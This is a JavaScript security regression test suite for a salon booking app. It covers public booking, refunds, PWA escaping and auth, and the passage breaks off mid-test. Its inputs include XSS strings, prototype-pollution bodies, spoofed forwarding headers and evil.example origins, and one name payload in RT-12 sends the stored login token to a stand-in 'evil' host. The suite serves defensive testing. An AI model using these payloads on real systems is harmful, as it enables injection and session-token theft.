// Red Team Gate (docs/audit/RED_TEAM_2026-11.md). Cada teste tenta PROVAR que uma
// superfície falha; os achados corrigidos viram regressão aqui. HTTP real contra o
// app; banco, identidade e provedor de login em memória. Datas fixas (relógios
// injetados), nada depende de new Date().
//
// Superfícies: agendamento público (/api/public/*), estorno de comanda, PWA
// (escape de nomes, override de API, CSP da página pública), auth geral (RBAC em
// todas as rotas, rate limit, CORS, logs).
// Os controles negativos (NR*) carregam cópias do código com a proteção removida e
// mostram que o mesmo ataque passa.
process.env.API_ACCESS_TOKEN = process.env.API_ACCESS_TOKEN || 'legacy-redteam-token';
process.env.SUPABASE_URL = process.env.SUPABASE_URL || 'https://example.invalid';
process.env.SUPABASE_SECRET_KEY = process.env.SUPABASE_SECRET_KEY || 'gate';

const assert = require('assert');
const fs = require('fs');
const http = require('http');
const path = require('path');
const Module = require('module');
const { pathToFileURL } = require('url');
const { randomUUID } = require('crypto');
const express = require('express');
const { env } = require('../src/config/env');
const clock = require('../src/config/clock');
const { setAuthProvider } = require('../src/auth/provider');
const { setIdentityStore, createMemoryIdentityStore } = require('../src/auth/identityStore');
const { installMemoryBackend } = require('../src/dev/memoryBackend');
const { SupabaseRepository } = require('../src/repositories/SupabaseRepository');
const { calcularEstorno } = require('../src/engines/EstornoEngine');
const { createAppError } = require('../src/errors');
const publico = require('../src/routes/publicBooking');
const { resetRateLimit: resetRateLimitLogin } = require('../src/routes/auth');
const { app } = require('../src/app');

const RAIZ = path.resolve(__dirname, '../..');
const ler = rel => fs.readFileSync(path.join(RAIZ, rel), 'utf8');

// ---------------------------------------------------------------------------
// Dados. Empresa A = DEFAULT_EMPRESA_ID (agendamento público + estorno); B = outra.
const A = env.DEFAULT_EMPRESA_ID;
const B = 'e0000000-0000-4000-8000-0000000000bb';
const AGORA_PUB = new Date('2026-11-10T12:00:00Z'); // 09:00 em São Paulo (terça)
const AMANHA = '2026-11-11';
const DEPOIS = '2026-11-12';
const CORTE = 'b0000000-0000-4000-8000-0000000000c1';
const ANA = 'a0000000-0000-4000-8000-0000000000c1';
const BETO = 'a0000000-0000-4000-8000-0000000000c2';
const DUP1 = 'd0000000-0000-4000-8000-0000000000c1';
const DUP2 = 'd0000000-0000-4000-8000-0000000000c2';
const dia = { ativo: true, inicio: '09:00', fim: '18:00' };
const semana = { dom: dia, seg: dia, ter: dia, qua: dia, qui: dia, sex: dia, sab: dia };

const [ADMIN, GESTOR, RECEP, MULTI, ADMIN_B] = ['01', '02', '03', '04', '05'].map(s => `c0000000-0000-4000-8000-0000000000${s}`);
const UNIT = 'f0000000-0000-4000-8000-0000000000c1';
const HOJE_E = '2026-12-02';
const cid = n => `1${String(n).padStart(7, '0')}-0000-4000-8000-0000000000c1`;
const iid = n => `2${String(n).padStart(7, '0')}-0000-4000-8000-0000000000c1`;
const CM_RACE = cid(1); const CM_ROUND = cid(2); const CM_PRAZO = cid(3); const CM_IDEM1 = cid(4); const CM_IDEM2 = cid(5); const CM_IDEM_B = cid(6);
const servicoItem = (id, comando_id, empresa_id, quantidade, valor, comissao) => ({
  id, comando_id, empresa_id, tipo: 'servico', servico_id: CORTE, profissional_id: ANA, quantidade, descricao: 'Corte',
  valor_liquido_centavos: valor, total_venda_centavos: valor, comissao_centavos: comissao, receita_empresa_centavos: valor - comissao, total_custo_centavos: 0
});
const comanda = (id, empresa_id, data, total) => ({ id, empresa_id, data, hora: '10:00', status: 'fechado', itens_liquidos_centavos: total, total_recebido_centavos: total });
const pag = (comando_id, empresa_id, forma_code, valor_centavos) => ({ id: randomUUID(), comando_id, empresa_id, forma_code, valor_centavos, taxa_total_centavos: 0 });

const db = installMemoryBackend({
  empresas: [
    { id: A, nome: 'Salão Alfa', horario_por_dia: semana, slot_padrao: 30, buffer_min: 0, regua_alerta_faltas: 2, regua_sinal_faltas: 3 },
    { id: B, nome: 'Salão Beta', horario_por_dia: semana, slot_padrao: 30, buffer_min: 0 }
  ],
  servicos: [{ id: CORTE, empresa_id: A, nome: 'Corte', valor_centavos: 5000, duracao_min: 30, ativo: true }],
  profissionais: [
    { id: ANA, empresa_id: A, nome: 'Ana Souza', ativo: true, horario: semana, overrides: {} },
    { id: BETO, empresa_id: A, nome: 'Beto', ativo: true, horario: semana, overrides: {} }
  ],
  profissional_servicos: [{ empresa_id: A, profissional_id: ANA, servico_id: CORTE }, { empresa_id: A, profissional_id: BETO, servico_id: CORTE }],
  clientes: [
    // Mesmo número em dois cadastros ativos ("ambíguo"); o mais novo tem 2 futuros.
    { id: DUP1, empresa_id: A, nome: 'Dup Antigo', whatsapp: '11 97777-1234', ativo: true, created_at: '2026-01-01T00:00:00Z' },
    { id: DUP2, empresa_id: A, nome: 'Dup Novo', whatsapp: '(11) 97777-1234', ativo: true, created_at: '2026-06-01T00:00:00Z' }
  ],
  agendamentos: [
    { id: randomUUID(), empresa_id: A, cliente_id: DUP2, servico_id: CORTE, profissional_id: BETO, data: DEPOIS, horario: '09:00:00', duracao_min: 30, status: 'agendado' },
    { id: randomUUID(), empresa_id: A, cliente_id: DUP2, servico_id: CORTE, profissional_id: BETO, data: DEPOIS, horario: '10:00:00', duracao_min: 30, status: 'confirmado' }
  ],
  agendamento_eventos: [], produtos: [], formas_pagamento: [], comando_gorjetas: [], caixa_movimentos: [],
  comandos: [
    comanda(CM_RACE, A, HOJE_E, 1000), comanda(CM_ROUND, A, HOJE_E, 2001), comanda(CM_PRAZO, A, '2026-11-01', 500),
    comanda(CM_IDEM1, A, HOJE_E, 800), comanda(CM_IDEM2, A, HOJE_E, 800), comanda(CM_IDEM_B, B, HOJE_E, 800)
  ],
  comando_itens: [
    servicoItem(iid(1), CM_RACE, A, 1, 1000, 400),
    servicoItem(iid(2), CM_ROUND, A, 3, 1001, 333), servicoItem(iid(3), CM_ROUND, A, 7, 999, 401), servicoItem(iid(4), CM_ROUND, A, 1, 1, 0),
    servicoItem(iid(5), CM_PRAZO, A, 1, 500, 200),
    servicoItem(iid(6), CM_IDEM1, A, 2, 800, 320), servicoItem(iid(7), CM_IDEM2, A, 2, 800, 320), servicoItem(iid(8), CM_IDEM_B, B, 2, 800, 0)
  ],
  comando_pagamentos: [
    pag(CM_RACE, A, 'pix', 1000), pag(CM_ROUND, A, 'pix', 2001), pag(CM_PRAZO, A, 'pix', 500),
    pag(CM_IDEM1, A, 'pix', 800), pag(CM_IDEM2, A, 'pix', 800), pag(CM_IDEM_B, B, 'pix', 800)
  ]
});

const store = createMemoryIdentityStore({
  app_users: [ADMIN, GESTOR, RECEP, MULTI, ADMIN_B].map(u => ({ id: u, email: `${u}@t`, nome: u, ativo: true })),
  unidades: [{ id: UNIT, empresa_id: A, nome: 'U', ativo: true }],
  empresa_memberships: [
    { id: 'm1', empresa_id: A, user_id: ADMIN, role: 'admin', status: 'ativo' },
    { id: 'm2', empresa_id: A, user_id: GESTOR, role: 'gestor', status: 'ativo' },
    { id: 'm3', empresa_id: A, user_id: RECEP, role: 'recepcao', status: 'ativo' },
    // MULTI: admin em B, recepção em A. Escolher A não herda o papel de B.
    { id: 'm4', empresa_id: A, user_id: MULTI, role: 'recepcao', status: 'ativo' },
    { id: 'm5', empresa_id: B, user_id: MULTI, role: 'admin', status: 'ativo' },
    { id: 'm6', empresa_id: B, user_id: ADMIN_B, role: 'admin', status: 'ativo' }
  ],
  membership_units: [{ membership_id: 'm3', unit_id: UNIT }, { membership_id: 'm4', unit_id: UNIT }]
});
setIdentityStore(store);
const TOKENS = { 'h.admin.s': ADMIN, 'h.gestor.s': GESTOR, 'h.recep.s': RECEP, 'h.multi.s': MULTI, 'h.adminb.s': ADMIN_B };
let tentativasLogin = 0;
setAuthProvider({
  async getUser(t) { if (!TOKENS[t]) throw createAppError('UNAUTHENTICATED', 'x', 401); return { id: TOKENS[t] }; },
  async signIn() { tentativasLogin++; throw createAppError('INVALID_CREDENTIALS', 'E-mail ou senha inválidos.', 401); },
  async recoverPassword() { return null; }
});

// ---------------------------------------------------------------------------
// HTTP
const agente = new http.Agent({ keepAlive: true, maxSockets: 8 });
let base;
function request(method, urlPath, { body, raw, headers: extra = {}, token, baseUrl } = {}) {
  return new Promise((resolve, reject) => {
    const payload = raw !== undefined ? raw : body !== undefined ? JSON.stringify(body) : null;
    const headers = { ...(token ? { authorization: `Bearer ${token}` } : {}) };
    if (payload !== null) { headers['content-type'] = 'application/json'; headers['content-length'] = Buffer.byteLength(payload); }
    Object.assign(headers, extra);
    const req = http.request((baseUrl || base) + urlPath, { method, headers, agent: agente }, res => {
      let txt = ''; res.on('data', c => { txt += c; });
      res.on('end', () => { let data = null; try { data = JSON.parse(txt); } catch (_) {} resolve({ status: res.statusCode, data, raw: txt, headers: res.headers }); });
    });
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}
const code = r => r.data && r.data.error && r.data.error.code;
const LINKS = JSON.stringify({ 'salao-alfa': A });
const limitesAltos = () => Object.assign(env, {
  PUBLIC_BOOKING_LINKS: LINKS,
  PUBLIC_BOOKING_RATE_GET_MAX: 1000, PUBLIC_BOOKING_RATE_POST_IP_MAX: 1000, PUBLIC_BOOKING_RATE_POST_NUMERO_MAX: 1000,
  PUBLIC_BOOKING_TETO_DIARIO: 1000, PUBLIC_BOOKING_MAX_FUTUROS_POR_NUMERO: 2, PUBLIC_BOOKING_ANTECEDENCIA_MIN: 120, PUBLIC_BOOKING_JANELA_DIAS: 30
});
const pedido = extra => ({ servicoId: CORTE, profissionalId: ANA, data: AMANHA, horario: '11:00', nome: 'Maria Teste', whatsapp: '(21) 99999-0001', consentimento: true, website: '', ...extra });
const post = (body, opts = {}) => request('POST', '/api/public/agendar/salao-alfa', { body, ...opts });
const contar = () => ({ ag: db.agendamentos.length, cli: db.clientes.length, ev: db.agendamento_eventos.length });
const MOTIVO = { motivoCodigo: 'erro_lancamento', motivo: 'Lançamento em duplicidade no balcão' };
const estornar = (comandaId, body, token = 'h.admin.s', headers) => request('POST', `/api/comandas/${comandaId}/estorno`, { token, body: { ...MOTIVO, ...body }, headers });
const daComanda = (t, c) => (db[t] || []).filter(r => r.comando_id === c);
const soma = (rows, f) => rows.reduce((s, r) => s + Number(f(r) || 0), 0);

// Cópia de um módulo do backend com trechos trocados (controle negativo).
function moduloMutante(rel, trocas) {
  const arquivo = require.resolve(rel);
  let src = fs.readFileSync(arquivo, 'utf8');
  for (const [de, para] of trocas) {
    assert.ok(src.includes(de), `trecho do mutante não encontrado em ${rel}: ${de}`);
    src = src.split(de).join(para);
  }
  const m = new Module(arquivo, module);
  m.filename = arquivo;
  m.paths = Module._nodeModulePaths(path.dirname(arquivo));
  m._compile(src, arquivo);
  return m.exports;
}
async function comServidor(appX, fn) {
  const srv = appX.listen(0);
  try { return await fn(`http://127.0.0.1:${srv.address().port}`); } finally { srv.close(); }
}
// Captura console.* e stdout (morgan) durante fn.
async function capturarSaida(fn) {
  const linhas = [];
  const orig = { error: console.error, warn: console.warn, log: console.log, write: process.stdout.write };
  const guardar = (...a) => linhas.push(a.map(x => (x instanceof Error ? `${x.stack} ${JSON.stringify(x)}` : typeof x === 'string' ? x : JSON.stringify(x))).join(' '));
  console.error = guardar; console.warn = guardar; console.log = guardar;
  process.stdout.write = (chunk, ...resto) => { linhas.push(String(chunk)); return true; };
  try { await fn(); } finally {
    console.error = orig.error; console.warn = orig.warn; console.log = orig.log; process.stdout.write = orig.write;
  }
  return linhas.join('\n');
}

const tests = [];
const test = (n, f) => tests.push({ n, f });

// ===========================================================================
// 1. Agendamento online público
// ===========================================================================
test('RT-01 rate limit por IP não se contorna girando o IPv6 dentro do mesmo /64 (nem com ::ffff:)', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  env.PUBLIC_BOOKING_RATE_POST_IP_MAX = 3;
  try {
    // trust proxy 1: o IP do cliente é o último X-Forwarded-For (o que o proxy do Render acrescenta).
    const ips = ['2001:db8:1:2::a', '2001:db8:1:2::b', '2001:db8:1:2:ffff::c', '2001:0db8:0001:0002:0000:0000:0000:00d0'];
    const st = [];
    for (const ip of ips) st.push((await post({}, { headers: { 'x-forwarded-for': ip } })).status);
    assert.deepStrictEqual(st, [422, 422, 422, 429], `4ª tentativa do mesmo /64 deveria ser 429: ${st}`);
    // Outro /64 é outro cliente.
    assert.strictEqual((await post({}, { headers: { 'x-forwarded-for': '2001:db8:1:3::a' } })).status, 422);
    publico.resetRateLimitPublico();
    const v4 = [];
    for (const ip of ['203.0.113.9', '::ffff:203.0.113.9', '203.0.113.9', '::FFFF:203.0.113.9']) v4.push((await post({}, { headers: { 'x-forwarded-for': ip } })).status);
    assert.deepStrictEqual(v4, [422, 422, 422, 429], `IPv4 e IPv4-mapeado são o mesmo cliente: ${v4}`);
  } finally { publico.resetRateLimitPublico(); limitesAltos(); }
});

test('RT-02 WhatsApp no formato antigo (sem o 9) é o MESMO número: limite por número e de futuros valem', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const antes = contar();
  assert.strictEqual((await post(pedido({ horario: '13:00', whatsapp: '21 99876-5432' }))).status, 201);
  assert.strictEqual((await post(pedido({ horario: '14:00', whatsapp: '21 99876-5432' }))).status, 201);
  // Mesma linha móvel escrita com 8 dígitos (antes do 9º dígito): não pode virar cliente novo.
  const r = await post(pedido({ horario: '15:00', whatsapp: '(21) 9876-5432' }));
  assert.strictEqual(r.status, 422, `3º futuro pelo formato antigo deveria ser recusado: ${r.raw}`);
  assert.strictEqual(code(r), 'AGENDAMENTO_ONLINE_INDISPONIVEL');
  assert.strictEqual(contar().cli, antes.cli + 1, 'um cadastro só para o número');
  // Telefone fixo de 8 dígitos (começa com 2–5) não ganha 9: continua outro número.
  assert.strictEqual((await post(pedido({ horario: '16:00', whatsapp: '(21) 3876-5432' }))).status, 201);
  // Limite por número (rate) também compartilhado entre os dois formatos.
  publico.resetRateLimitPublico(); env.PUBLIC_BOOKING_RATE_POST_NUMERO_MAX = 1;
  await post(pedido({ horario: '20:00', whatsapp: '31 98765-0000' }));
  assert.strictEqual(code(await post(pedido({ horario: '20:00', whatsapp: '31 8765-0000' }))), 'MUITAS_TENTATIVAS');
  publico.resetRateLimitPublico(); limitesAltos();
});

test('RT-03 número com dois cadastros ativos: o limite de futuros soma os dois (não só o mais antigo)', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const antes = contar();
  const r = await post(pedido({ horario: '12:00', whatsapp: '11 97777-1234' }));
  assert.strictEqual(r.status, 422, `DUP2 já tem 2 futuros: ${r.raw}`);
  assert.strictEqual(code(r), 'AGENDAMENTO_ONLINE_INDISPONIVEL');
  assert.deepStrictEqual(contar(), antes);
});

test('RT-04 nome: HTML, aspas, controle bidi, zero-width e emoji recusados; apóstrofo aceito e escapado na PWA', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const antes = contar();
  for (const nome of ['<img src=x onerror=alert(1)>', 'Ana"><script>', 'Ana‮gnp.exe', 'Ana​Maria', 'Ana 😀', 'javascript:alert(1)', 'Ana`x`', 'Ana&amp;', '  ', 'A']) {
    const r = await post(pedido({ nome, whatsapp: '21 91111-0001' }));
    assert.strictEqual(r.status, 422, `nome aceito: ${JSON.stringify(nome)} → ${r.raw}`);
  }
  assert.deepStrictEqual(contar(), antes);
  // O apóstrofo é legítimo (D'Ávila) e é o único caractere "perigoso" que passa: a PWA o escapa.
  const { escapeHtml } = await importarPwa('js/utils.js');
  assert.strictEqual(escapeHtml("D'Ávila"), 'D&#39;Ávila');
});

test('RT-05 mass assignment, __proto__, aninhamento e text/plain (CSRF simples) recusados sem gravar', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const antes = contar();
  const casos = [
    { raw: '{"__proto__":{"empresaId":"x"},' + JSON.stringify(pedido()).slice(1) },
    { raw: '{"constructor":{"prototype":{"admin":true}},' + JSON.stringify(pedido()).slice(1) },
    { body: pedido({ nome: [[[['Maria']]]] }) },
    { body: pedido({ whatsapp: { $ne: null } }) },
    { body: pedido({ consentimento: 'true' }) },
    { body: pedido({ servicoId: [CORTE] }) },
    { body: [pedido()] }
  ];
  for (const c of casos) {
    const r = await request('POST', '/api/public/agendar/salao-alfa', c);
    assert.ok([400, 422].includes(r.status), `${JSON.stringify(c).slice(0, 80)} → ${r.status}`);
  }
  // Form HTML de outro site (sem preflight) manda text/plain: o parser ignora, nada grava.
  const tp = await request('POST', '/api/public/agendar/salao-alfa', { raw: JSON.stringify(pedido()), headers: { 'content-type': 'text/plain' } });
  assert.strictEqual(tp.status, 422, tp.raw);
  assert.deepStrictEqual(contar(), antes);
  assert.strictEqual(Object.prototype.empresaId, undefined); assert.strictEqual(Object.prototype.admin, undefined);
});

test('RT-06 datas e horas inválidas (30/02, mês 13, ISO com hora, ano estendido, 24:00, segundos) → 422', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const antes = contar();
  for (const [data, horario] of [['2026-02-30', '11:00'], ['2026-13-01', '11:00'], ['2026-11-11T10:00', '11:00'], ['+002026-11-11', '11:00'],
    ['2026-11-11 ', '11:00'], [AMANHA, '24:00'], [AMANHA, '11:00:00'], [AMANHA, '1:00'], [AMANHA, '११:००'], ['２０２６-11-11', '11:00']]) {
    const r = await post(pedido({ data, horario, whatsapp: '21 91111-0002' }));
    assert.strictEqual(r.status, 422, `${data} ${horario} → ${r.raw}`);
  }
  const s = await request('GET', `/api/public/agendar/salao-alfa/slots?servicoId=${CORTE}&profissionalId=${ANA}&data=2026-02-29`);
  assert.strictEqual(s.status, 422, '2026 não é bissexto');
  assert.deepStrictEqual(contar(), antes);
});

test('RT-07 buffer e encaixe: horário colado no atendimento (dentro do buffer) não é ofertado nem aceito', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const empresa = db.empresas.find(e => e.id === A);
  empresa.buffer_min = 15;
  // Encaixe fora da grade (13:10–13:40) feito pela recepção com permitirConflito.
  db.agendamentos.push({ id: randomUUID(), empresa_id: A, cliente_id: DUP1, servico_id: CORTE, profissional_id: BETO, data: AMANHA, horario: '13:10:00', duracao_min: 30, status: 'agendado' });
  try {
    const slots = (await request('GET', `/api/public/agendar/salao-alfa/slots?servicoId=${CORTE}&profissionalId=${BETO}&data=${AMANHA}`)).data.data.slots;
    for (const h of ['12:30', '13:00', '13:30']) assert.ok(!slots.includes(h), `${h} conflita com o encaixe + buffer: ${slots}`);
    const r = await post(pedido({ profissionalId: BETO, horario: '13:30', whatsapp: '21 91111-0003' }));
    assert.strictEqual(r.status, 422); assert.strictEqual(code(r), 'HORARIO_INDISPONIVEL');
  } finally { empresa.buffer_min = 0; }
});

test('RT-08 enumeração de clientes: número novo e número conhecido têm o MESMO status, corpo e headers', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const novo = await post(pedido({ profissionalId: BETO, data: DEPOIS, horario: '15:00', nome: 'Pessoa X', whatsapp: '21 92222-0001' }));
  // O mesmo número, agora já cadastrado, com outro nome: a resposta não pode diferir.
  const repetido = await post(pedido({ profissionalId: BETO, data: DEPOIS, horario: '16:00', nome: 'Outro Nome', whatsapp: '21 92222-0001' }));
  for (const r of [novo, repetido]) assert.strictEqual(r.status, 201, r.raw);
  const semVariaveis = r => { const { date, etag, 'content-length': _cl, 'x-request-id': _rid, ...h } = r.headers; return h; };
  assert.deepStrictEqual(semVariaveis(repetido), semVariaveis(novo), 'headers diferem entre número novo e conhecido');
  assert.deepStrictEqual(Object.keys(repetido.data.data).sort(), Object.keys(novo.data.data).sort());
  assert.ok(!repetido.raw.includes('Pessoa X') && !repetido.raw.includes('Outro Nome'), 'nome nunca volta na resposta');
});

test('RT-09 cache, CORS e headers: toda resposta pública é no-store + nosniff; origem estranha não é refletida', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const respostas = [
    await request('GET', '/api/public/agendar/salao-alfa'),
    await request('GET', '/api/public/agendar/nao-existe'),
    await post({}),
    await request('POST', '/api/public/agendar/salao-alfa', { raw: '{"x":' }),
    await request('POST', '/api/public/agendar/salao-alfa', { body: { nome: 'a'.repeat(12000) } })
  ];
  env.PUBLIC_BOOKING_RATE_GET_MAX = 0;
  respostas.push(await request('GET', '/api/public/agendar/salao-alfa'));
  limitesAltos(); publico.resetRateLimitPublico();
  assert.deepStrictEqual(respostas.map(r => r.status), [200, 404, 422, 400, 413, 429]);
  for (const r of respostas) {
    assert.strictEqual(r.headers['cache-control'], 'no-store', `${r.status} sem no-store`);
    assert.strictEqual(r.headers['x-content-type-options'], 'nosniff');
    assert.ok(!r.headers['x-powered-by']);
  }
  for (const origem of ['https://evil.example', 'https://hudson-f-lima.github.io.evil.example', 'http://192.168.0.1.evil.example']) {
    const pf = await request('OPTIONS', '/api/public/agendar/salao-alfa', { headers: { origin: origem, 'access-control-request-method': 'POST', 'access-control-request-headers': 'content-type' } });
    assert.ok(!pf.headers['access-control-allow-origin'], `origem ${origem} refletida`);
  }
});

test('RT-10 logs: erro interno do agendamento não grava WhatsApp/nome; morgan nunca grava token nem corpo', async () => {
  publico.resetRateLimitPublico(); limitesAltos();
  const P = SupabaseRepository.prototype;
  const insertOriginal = P.insert;
  // Simula o erro do Postgres que repete a linha (detail com o número do cliente).
  P.insert = async function (t, p) {
    if (t === 'clientes') {
      const e = new Error(`duplicate key value violates unique constraint "clientes_whatsapp" Key (whatsapp)=(${p.whatsapp}) nome ${p.nome}`);
      e.code = '23505'; e.details = `Key (empresa_id, whatsapp)=(${A}, ${p.whatsapp})`;
      throw e;
    }
    return insertOriginal.call(this, t, p);
  };
  let r;
  const saida = await capturarSaida(async () => {
    try { r = await post(pedido({ horario: '17:00', nome: 'Fulana Logada', whatsapp: '21 94321-8765' })); } finally { P.insert = insertOriginal; }
    await request('GET', '/api/agenda?data=2026-11-11', { token: 'h.admin.s' });
    await request('GET', '/api/agenda', { token: env.API_ACCESS_TOKEN });
  });
  assert.strictEqual(r.status, 500); assert.strictEqual(code(r), 'INDISPONIVEL_AGORA');
  assert.ok(!/Key \(|duplicate key/.test(r.raw), 'detalhe do banco na resposta');
  for (const proibido of ['94321', '5521943218765', 'Fulana', 'h.admin.s', env.API_ACCESS_TOKEN]) {
    assert.ok(!saida.includes(proibido), `log contém "${proibido}":\n${saida}`);
  }
  assert.ok(/\[agendar\] erro interno/.test(saida), 'o erro continua registrado (sem PII)');
});

test('RT-11 página pública: ?apiBase= só vale em host local; agendar.html tem CSP própria e aviso completo', async () => {
  const { apiBaseDaUrl, hostLocal } = await importarPwa('js/api-base.js');
  const evil = '?s=salao-alfa&apiBase=https://evil.example/api';
  for (const host of ['hudson-f-lima.github.io', 'hopeos-v1-frontend.onrender.com', 'salao.com.br', '127.0.0.1.evil.example', '10.0.0.1.nip.io']) {
    assert.strictEqual(apiBaseDaUrl({ search: evil, hostname: host }), null, `override aceito em ${host}`);
  }
  for (const host of ['127.0.0.1', 'localhost', '192.168.0.12', '10.1.2.3', '172.20.0.5', '[::1]']) {
    assert.ok(hostLocal(host), host);
    assert.strictEqual(apiBaseDaUrl({ search: '?apiBase=http://127.0.0.1:3399/api/', hostname: host }), 'http://127.0.0.1:3399/api');
  }
  assert.strictEqual(apiBaseDaUrl({ search: '?apiBase=javascript:alert(1)', hostname: 'localhost' }), null);
  // Os dois pontos de entrada usam a regra; nenhum lê ?apiBase= por conta própria.
  for (const arq of ['js/agendar.js', 'js/api.js']) {
    const src = ler(arq);
    assert.ok(/import \{[^}]*apiBaseDaUrl[^}]*\} from '\.\/api-base\.js'/.test(src), `${arq} não usa api-base.js`);
    assert.ok(!/get\(['"]apiBase['"]\)/.test(src), `${arq} ainda lê ?apiBase= direto`);
  }
  const html = ler('agendar.html');
  const csp = (html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1] || '';
  assert.ok(csp, 'agendar.html sem CSP própria (GitHub Pages não manda header)');
  for (const d of ["default-src 'none'", "script-src 'self'", "connect-src 'self' https://hopeos-v1.onrender.com", "base-uri 'none'", "form-action 'none'"]) assert.ok(csp.includes(d), `CSP sem ${d}`);
  assert.ok(!/unsafe-inline|unsafe-eval|connect-src[^;]*https:(\s|;|$)/.test(csp), 'CSP frouxa');
  const aviso = html.slice(html.indexOf('<details class="privacidade">'), html.indexOf('</details>'));
  for (const termo of ['controlador', 'finalidade', 'base legal', 'execução', 'guardados', 'direitos', 'operador']) {
    assert.ok(aviso.toLowerCase().includes(termo), `aviso curto sem "${termo}"`);
  }
  assert.ok(ler('service-worker.js').includes("'./js/api-base.js'"), 'api-base.js fora do cache do service worker');
});

// ===========================================================================
// 2. PWA interna: nome vindo de cadastro (recepção, integração ou link público)
// ===========================================================================
async function importarPwa(rel) {
  globalThis.window = globalThis.window || globalThis;
  globalThis.localStorage = globalThis.localStorage || { getItem: () => null, setItem() {}, removeItem() {} };
  globalThis.document = globalThis.document || { getElementById: () => null, addEventListener() {}, querySelectorAll: () => [], createElement: () => ({}) };
  return import(pathToFileURL(path.join(RAIZ, rel)).href);
}

test('RT-12 FuzzyField (busca de cliente/serviço/profissional) escapa o rótulo: nome com HTML não vira DOM', async () => {
  const { FuzzyField } = await importarPwa('js/components/fuzzy-field.js');
  let html = '';
  const dropdown = { style: {}, addEventListener() {}, querySelectorAll: () => [], set innerHTML(v) { html = v; }, get innerHTML() { return html; } };
  const input = { value: '', parentElement: { style: {}, appendChild() {} }, addEventListener() {} };
  const docAnterior = globalThis.document;
  globalThis.document = { getElementById: () => input, createElement: () => dropdown };
  try {
    const nome = `<img src=x onerror="fetch('//evil/?t='+localStorage.hopeos_token)">"' data-x="`;
    const f = new FuzzyField('agCliente', [{ id: 'c1', nome }], { labelFn: c => c.nome, valueFn: c => c.id, onSelect() {} });
    f.showDropdown(f.items);
  } finally { globalThis.document = docAnterior; }
  assert.ok(html.includes('data-value="c1"'), html);
  assert.ok(!/<img/i.test(html), `nome virou tag:\n${html}`);
  assert.ok(!/data-label="[^"]*"[^>]*onerror/.test(html) && !html.includes('" data-x="'), `nome saiu do atributo:\n${html}`);
  assert.ok(html.includes('&lt;img src=x onerror=&quot;'), 'texto escapado');
});

// Varredura estática: interpolação ${...} de campo de texto livre (nome, label,
// ícone, código, motivo, descrição, observação) em HTML precisa de escapeHtml.
// Exceções só com justificativa (textContent, title, link wa.me codificado etc.).
const CAMPO_LIVRE = /(nome|Nome|label|\.icon|\.code\b|motivo|descricao|observ)/;
const CONTEXTO_SEGURO = /textContent|\.title\s*=|labelFn|waLink\(|encodeURIComponent|console\.|api\(`|showToast|showBanner|confirm(Dialog|Modal)?\(|throw new Error|Error\(`|setAttribute\('aria-label'|document\.title/;
const EXCECOES = [
  // agendar.js: tudo por textContent (el(..., { text })), sem innerHTML.
  /^js\/agendar\.js:/,
  // comissoes.js: opcoes() escapa rótulo e valor; o template monta só a tupla.
  /^js\/ui\/comissoes\.js:.*map\(c => \[c\.id/,
  // dashboard.js: linha() escapa o rótulo.
  /^js\/ui\/dashboard\.js:.*linha\(`· \$\{p\.nome\}`/,
  /^js\/ui\/onboarding\.js:.*linha\(`Comissão de \$\{prof\.nome\}/,
  // onboarding.js: nome do dia da semana (constante DIAS) e título da fase (constante).
  /^js\/ui\/onboarding\.js:.*\$\{nome\}/, /^js\/ui\/onboarding\.js:.*\$\{atual\.titulo\}/,
  // Texto da mensagem do WhatsApp: vai para waLink (encodeURIComponent) e o href é escapado.
  /^js\/ui\/agenda\.js:.*const texto = `Olá \$\{nome\}/, /^js\/ui\/onboarding\.js:.*const convite = p => waLink/,
  /^js\/ui\/cadastros\.js:.*waLink\(cliente\.whatsapp/,
  // checkout.js / cadastros.js: atribuições em textContent na linha anterior/seguinte.
  /^js\/ui\/cadastros\.js:.*normalizeSearchText\(`\$\{c\.nome/,
  /^js\/ui\/cadastros\.js:.*metaParts\.push/,
  // dashboard.js: `nome` já é escapeHtml(c.nome) na linha anterior.
  /^js\/ui\/dashboard\.js:.*<span>\$\{nome\}<\/span>/,
  // equipe.js / onboarding.js: o "match" é aria-label literal ou f.code só usado em has().
  /^js\/ui\/equipe\.js:.*aria-label="Cadastro de profissional"/,
  /^js\/ui\/onboarding\.js:.*existentes\.has\(f\.code\)/,
  // onboarding.js: o match é o <label> literal do campo de e-mail (sem dado).
  /^js\/ui\/onboarding\.js:.*<label for="onbProfEmail">/
];
function varrerPwa() {
  const achados = [];
  const arquivos = ['js/app.js', 'js/agendar.js', 'js/utils.js', 'js/components/fuzzy-field.js', ...fs.readdirSync(path.join(RAIZ, 'js/ui')).map(f => `js/ui/${f}`)];
  for (const arq of arquivos) {
    ler(arq).split('\n').forEach((linha, i) => {
      for (const m of linha.matchAll(/\$\{((?:[^{}]|\{[^{}]*\})*)\}/g)) {
        const expr = m[1];
        if (!CAMPO_LIVRE.test(expr) || /escapeHtml\(/.test(expr) || /^\s*(campo|linha|opcoes)\(/.test(expr)) continue;
        if (CONTEXTO_SEGURO.test(linha)) continue;
        const id = `${arq}:${i + 1}: ${linha.trim()}`;
        if (EXCECOES.some(re => re.test(id))) continue;
        achados.push(id);
      }
    });
  }
  return achados;
}
test('RT-13 varredura: nenhum nome/rótulo/ícone/código de cadastro interpolado em HTML sem escapeHtml', async () => {
  const achados = varrerPwa();
  assert.deepStrictEqual(achados, [], `interpolações sem escape:\n${achados.join('\n')}`);
});

// ===========================================================================
// 3. Estorno
// ===========================================================================
const pedidoParcial = (key, comandoItemId, quantidade) => ({ tipo: 'parcial', idempotencyKey: key, itens: [{ comandoItemId, quantidade }] });

test('RT-14 corrida: dois parciais simultâneos do último item (chaves diferentes) → 1 grava, Σ estornado ≤ vendido', async () => {
  clock.definirRelogio(() => new Date('2026-12-02T15:00:00Z'));
  // Direto no repositório (a corrida pelo HTTP depende do agendamento de I/O e quase
  // nunca intercala): é o que o backend em memória precisa garantir como a RPC.
  const repo = new SupabaseRepository(A);
